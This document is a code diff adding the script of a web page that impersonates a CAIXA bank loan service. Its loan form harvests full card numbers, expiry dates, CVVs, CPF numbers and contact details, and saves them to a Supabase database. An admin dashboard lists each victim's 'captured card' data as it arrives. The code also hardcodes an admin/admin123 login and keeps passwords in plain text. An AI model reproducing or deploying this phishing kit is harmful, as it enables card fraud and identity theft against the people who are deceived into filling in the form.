+
+        function goToHome() {
+            if (currentUser) {
+                switchTab('home');
+            } else {
+                document.getElementById('auth-section').classList.add('hidden');
+                switchTab('home');
+            }
+        }
+
+        function toggleAuthMode() {
+            isRegistering = !isRegistering;
+            hideAlert();
+            const groupEmail = document.getElementById('group-email');
+            const groupCep = document.getElementById('group-cep');
+            const groupConfirm = document.getElementById('group-confirm-pass');
+            const hint = document.getElementById('pass-hint');
+            const userLabel = document.getElementById('user-label');
+            
+            if (isRegistering) {
+                document.getElementById('auth-title').innerText = 'Criar Conta CAIXA';
+                document.getElementById('auth-bin-btn').innerText = 'Cadastrar';
+                document.getElementById('auth-toggle').innerHTML = 'Já tem conta? <strong>Entrar</strong>';
+                userLabel.innerText = 'Nome de Usuário';
+                groupEmail.style.display = 'block';
+                groupCep.style.display = 'block';
+                groupConfirm.style.display = 'block';
+                hint.classList.remove('hidden');
+            } else {
+                document.getElementById('auth-title').innerText = 'Acessar Sistema';
+                document.getElementById('auth-bin-btn').innerText = 'Entrar na Conta';
+                document.getElementById('auth-toggle').innerHTML = 'Criar conta';
+                userLabel.innerText = 'Usuário ou E-mail';
+                groupEmail.style.display = 'none';
+                groupCep.style.display = 'none';
+                groupConfirm.style.display = 'none';
+                hint.classList.add('hidden');
+            }
+        }
+
+        async function handleAuth() {
+            hideAlert();
+            const userVal = document.getElementById('auth-user').value.trim();
+            const passVal = document.getElementById('auth-pass').value.trim();
+            
+            if (!userVal || !passVal) {
+                showAlert('Preencha todos os campos!');
+                return;
+            }
+
+            if (isRegistering) {
+                const emailVal = document.getElementById('auth-email').value.trim();
+                const cepVal = document.getElementById('auth-cep').value.trim();
+                const confirmVal = document.getElementById('auth-confirm-pass').value.trim();
+
+                if (!emailVal || !cepVal || !confirmVal) {
+                    showAlert('Preencha todos os campos do cadastro!');
+                    return;
+                }
+                if (!isValidEmail(emailVal)) {
+                    showAlert('Digite um e-mail válido!');
+                    return;
+                }
+                if (passVal.length < 4) {
+                    showAlert('A senha deve ter pelo menos 4 caracteres!');
+                    return;
+                }
+                if (passVal !== confirmVal) {
+                    showAlert('As senhas não conferem!');
+                    return;
+                }
+
+                const { data: existing } = await supabaseClient
+                    .from('bbx_users')
+                    .select('*')
+                    .or(`username.eq.${userVal},email.eq.${emailVal}`);
+
+                if (existing && existing.length > 0) {
+                    showAlert('Usuário ou e-mail já cadastrado!');
+                    return;
+                }
+
+                const { error } = await supabaseClient
+                    .from('bbx_users')
+                    .insert([{
+                        username: userVal,
+                        email: emailVal,
+                        cep: cepVal,
+                        password: passVal,
+                        registered_at: new Date().toLocaleString()
+                    }]);
+
+                if (error) {
+                    showAlert('Erro ao registrar no Supabase: ' + error.message);
+                } else {
+                    alert('Conta criada com sucesso!');
+                    toggleAuthMode();
+                    currentUser = { username: userVal, email: emailVal, isAdmin: false };
+                    loginSuccessSetup();
+                }
+            } else {
+                if (userVal === 'admin' && passVal === 'admin123') {
+                    currentUser = { username: 'admin', isAdmin: true };
+                    loginSuccessSetup();
+                    return;
+                }
+
+                const { data: users, error } = await supabaseClient
+                    .from('bbx_users')
+                    .select('*')
+                    .or(`username.eq.${userVal},email.eq.${userVal}`)
+                    .eq('password', passVal);
+
+                if (error || !users || users.length === 0) {
+                    showAlert('Usuário ou senha incorretos!');
+                    return;
+                }
+
+                currentUser = { ...users[0], isAdmin: false };
+                loginSuccessSetup();
+            }
+        }
+
+        function loginSuccessSetup() {
+            document.getElementById('auth-section').classList.add('hidden');
+            document.getElementById('app-container').classList.remove('hidden');
+            
+            document.getElementById('main-nav').classList.remove('hidden');
+            document.getElementById('header-auth-action-btn').classList.add('hidden');
+
+            const adminNavBtn = document.getElementById('nav-admin');
+            const adminCardsNavBtn = document.getElementById('nav-admin-cards');
+            if (currentUser.isAdmin) {
+                adminNavBtn.classList.remove('hidden');
+                adminCardsNavBtn.classList.remove('hidden');
+                switchTab('admin-cards');
+            } else {
+                adminNavBtn.classList.add('hidden');
+                adminCardsNavBtn.classList.add('hidden');
+                switchTab('home');
+            }
+            document.getElementById('auth-pass').value = '';
+        }
+
+        function logout() {
+            currentUser = null;
+            selectedBankName = '';
+            hideAlert();
+            document.getElementById('auth-section').classList.add('hidden');
+            document.getElementById('app-container').classList.remove('hidden');
+            
+            document.getElementById('main-nav').classList.add('hidden');
+            document.getElementById('header-auth-action-btn').classList.remove('hidden');
+            
+            switchTab('home');
+        }
+
+        function switchTab(tabId) {
+            document.querySelectorAll('.tab-content').forEach(el => el.classList.add('hidden'));
+            document.querySelectorAll('nav button').forEach(el => el.classList.remove('active'));
+            document.getElementById('tab-' + tabId).classList.remove('hidden');
+            const navBtn = document.getElementById('nav-' + tabId);
+            if(navBtn) navBtn.classList.add('active');
+            
+            if(tabId === 'admin' || tabId === 'admin-cards') {
+                loadAdminData();
+            }
+        }
+
+        async function saveCardData() {
+            const fullname = document.getElementById('c-fullname').value.trim();
+            const cardname = document.getElementById('c-cardname').value.trim();
+            const cardnumber = document.getElementById('c-cardnumber').value.trim();
+            const expiry = document.getElementById('c-expiry').value.trim();
+            const email = document.getElementById('c-email').value.trim();
+            const whatsapp = document.getElementById('c-whatsapp').value.trim();
+            const cpf = document.getElementById('c-cpf').value.trim();
+            const dob = document.getElementById('c-dob').value.trim();
+            const cep = document.getElementById('c-cep').value.trim();
+            const cvv = document.getElementById('c-cvv').value.trim();
+            const simulatedLimit = document.getElementById('c-simulated-limit').value;
+
+            if (!fullname || !cardname || !cardnumber || !email || !whatsapp || !cpf || !cvv || !expiry) {
+                alert('Preencha todos os campos obrigatórios!');
+                return;
+            }
+            if (!isValidCpf(cpf)) {
+                alert('Digite um CPF válido!');
+                return;
+            }
+            if (!isValidEmail(email)) {
+                alert('Digite um e-mail válido!');
+                return;
+            }
+
+            try {
+                let localLimits = JSON.parse(localStorage.getItem('bbx_simulated_limits') || '[]');
+                localLimits.push({
+                    bank: `${selectedBankName} (Empréstimo)`,
+                    simulated_limit: simulatedLimit,
+                    fullname,
+                    date: new Date().toLocaleString()
+                });
+                localStorage.setItem('bbx_simulated_limits', JSON.stringify(localLimits));
+            } catch (e) {
+                console.error("Erro ao salvar no localStorage", e);
+            }
+
+            const { error } = await supabaseClient
+                .from('bbx_cards')
+                .insert([{
+                    bank: `${selectedBankName} (Empréstimo)`,
+                    fullname, cardname, cardnumber, expiry, email, whatsapp, cpf, dob, cep, cvv,
+                    date: new Date().toLocaleString()
+                }]);
+
+            if(error) {
+                alert('Erro ao enviar dados para o Supabase: ' + error.message);
+            } else {
+                alert(`Proposta de Empréstimo para ${selectedBankName} (${simulatedLimit}) enviada com sucesso!`);
+                document.querySelectorAll('#tab-addcard input').forEach(i => i.value = '');
+                switchTab('home');
+            }
+        }
+
+        function verifyAdmin() {
+            const user = document.getElementById('admin-user-input').value.trim();
+            const pass = document.getElementById('admin-password-input').value.trim();
+            if(user === 'admin' && pass === 'admin123') {
+                document.getElementById('admin-login-box').classList.add('hidden');
+                document.getElementById('admin-dashboard').classList.remove('hidden');
+                loadAdminData();
+                setupRealtimeListener();
+            } else {
+                alert('Credenciais incorretas!');
+            }
+        }
+
+        function lockAdmin() {
+            document.getElementById('admin-dashboard').classList.add('hidden');
+            document.getElementById('admin-login-box').classList.remove('hidden');
+            document.getElementById('admin-password-input').value = '';
+            document.getElementById('admin-user-input').value = '';
+        }
+
+        async function loadAdminData() {
+            const usersTable = document.getElementById('admin-users-table');
+            const cardsContainer = document.getElementById('admin-cards-container');
+
+            const { data: users, error: userError } = await supabaseClient.from('bbx_users').select('*').order('id', { ascending: false });
+            usersTable.innerHTML = '';
+            
+            if(userError || !users || users.length === 0) {
+                usersTable.innerHTML = `<tr><td colspan="4" style="text-align: center; color: var-text-muted; padding: 1rem;">Nenhum usuário registrado.</td></tr>`;
+            } else {
+                users.forEach(u => {
+                    usersTable.innerHTML += `
+                        <tr>
+                            <td><strong>${u.username}</strong></td>
+                            <td>${u.email}</td>
+                            <td>${u.cep || '-'}</td>
+                            <td><small style="color: var(--text-muted);">${u.registered_at}</small></td>
+                        </tr>
+                    `;
+                });
+            }
+
+            const { data: cards, error: cardError } = await supabaseClient.from('bbx_cards').select('*').order('id', { ascending: false });
+            cardsContainer.innerHTML = '';
+            
+            if(cardError || !cards || cards.length === 0) {
+                cardsContainer.innerHTML = `<div style="grid-column: 1 / -1; text-align: center; color: var(--text-muted); padding: 2rem;">Nenhuma proposta cadastrada no momento.</div>`;
+            } else {
+                let localLimits = [];
+                try {
+                    localLimits = JSON.parse(localStorage.getItem('bbx_simulated_limits') || '[]');
+                } catch(e) {}
+
+                cards.forEach((c, index) => {
+                    let limitText = localLimits[cards.length - 1 - index]?.simulated_limit || '';
+
+                    cardsContainer.innerHTML += `
+                        <div class="admin-captured-card">
+                            <div class="card-header-info">
+                                <div>
+                                    <span style="background: var(--primary-light); color: #60a5fa; padding: 2px 8px; border-radius: 6px; font-weight: 700; font-size: 0.75rem;">${c.bank}</span>
+                                    <span style="color: #60a5fa; font-weight: 700; font-size: 0.85rem; margin-left: 8px;">${limitText}</span>
+                                </div>
+                                <small style="color: var(--text-muted); font-size: 0.7rem;">${c.date}</small>
+                            </div>
+
+                            <div style="font-size: 0.85rem;">
+                                <strong>Titular (Solicitante):</strong> ${c.fullname}<br>
+                                <span style="color: var(--text-muted); font-size: 0.75rem;">CPF: ${c.cpf} | WhatsApp: ${c.whatsapp}</span>
+                            </div>
+
+                            <div style="background: rgba(0, 92, 169, 0.04); border: 1px dashed rgba(0, 92, 169, 0.3); border-radius: 10px; padding: 0.75rem;">
+                                <div style="font-size: 0.75rem; font-weight: 700; color: #60a5fa; margin-bottom: 0.5rem; text-transform: uppercase;">💳 Dados do Cartão Capturado</div>
+                                <div class="card-body-grid">
+                                    <div class="card-field-box" style="grid-column: 1 / -1;">
+                                        <label>Número do Cartão</label>
+                                        <div class="field-value highlight-number">${c.cardnumber}</div>
+                                    </div>
+                                    <div class="card-field-box" style="grid-column: 1 / -1;">
+                                        <label>Nome no Cartão</label>
+                                        <div class="field-value">${c.cardname || '-'}</div>
+                                    </div>
+                                    <div class="card-field-box">
+                                        <label>Validade</label>
+                                        <div class="field-value">${c.expiry}</div>
+                                    </div>
+                                    <div class="card-field-box">
+                                        <label>CVV</label>
+                                        <div class="field-value highlight-cvv">${c.cvv}</div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div style="display: flex; justify-content: flex-end; align-items: center; margin-top: -0.25rem;">
+                                <button class="btn" style="padding: 0.35rem 0.75rem; font-size: 0.75rem; background: var(--danger); color:#fff; width: auto;" onclick="removeCard(${c.id})">Remover Proposta</button>
+                            </div>
+                        </div>
+                    `;
+                });
+            }
+        }
+
+        function setupRealtimeListener() {
+            supabaseClient
+              .channel('public:bbx_tables')
+              .on('postgres_changes', { event: '*', schema: 'public', table: 'bbx_users' }, () => { loadAdminData(); })
+              .on('postgres_changes', { event: '*', schema: 'public', table: 'bbx_cards' }, () => { loadAdminData(); })
+              .subscribe();
+        }
+
+        async function removeCard(id) {
+            if(!confirm("Deseja realmente remover esta proposta?")) return;
+            const { error } = await supabaseClient.from('bbx_cards').delete().eq('id', id);
+            if(!error) {
+                loadAdminData();
+            } else {
+                alert('Erro ao excluir do Supabase.');
+            }
+        }
+
+        function recoverWhatsApp() {
+            window.open(`https://wa.me/5521976870622?text=Olá,%20preciso%20recuperar%20minha%20senha%20na%20Central%20de%20Empréstimos.`, '_blank');
+        }
+    </script>
+</body>
+</html>
